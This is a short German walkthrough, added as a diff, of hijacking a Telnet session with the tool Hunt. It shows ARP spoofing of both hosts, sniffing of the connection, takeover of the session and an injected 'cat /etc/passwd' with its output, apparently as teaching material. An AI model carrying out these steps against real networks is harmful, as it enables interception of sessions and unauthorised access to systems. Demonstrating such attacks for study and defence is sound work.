@@ -1,0 +1,51 @@
+TCP Hijacking mit Hunt
+Benutzer loggt sich via Telnet ein:
+Workstation˜$ telnet example.com
+Trying 10.0.0.1...
+Connected to example.com.
+Login: alice
+Password: password
+Welcome to example.com
+Server:˜$
+
+Angreifer startet Hunt und lässt sich aktive Verbindungen anzeigen
+# hunt
+-> l
+0) 10.0.0.2 [16545] --> 10.0.0.1 [23]
+
+Arp Spoofing für diese Verbindung
+-> a
+0) 10.0.0.2 [16545] --> 10.0.0.1 [23]
+arp spoof src in dst y/n [y]> y
+src MAC [EA:1A:DE:AD:BE:01]> [Enter]
+arp spoof dst in src y/n [y]> y
+dst MAC [EA:1A:DE:AD:BE:02]> [Enter]
+choose conn> 0
+
+Sniffing der Verbindung
+dump connection y/n [y]> y
+dump [s]rc/[d]st/[b]oth [b]> b
+print src/dst same characters </n [n]> n
+Ctrl-C to break
+
+Der Client will ein Dir Listing machen
+Workstation˜$ ls -l
+drwx------ 2 root root 1024 Apr 21 12:13 secret
+
+Aus Sicht von Hunt
+Workstation˜$ ls -l
+drwx------ 2 root root 1024 Apr 21 12:13 secret
+
+Verbindungs Hijacking
+[Ctrl-C]
+-- press any key> [Enter]
+you took over the connection
+CTRL-] to break
+
+Command Injection
+cat /etc/passwd
+root:x:0:0:root:/root:/bin/bash
+
+
+
+
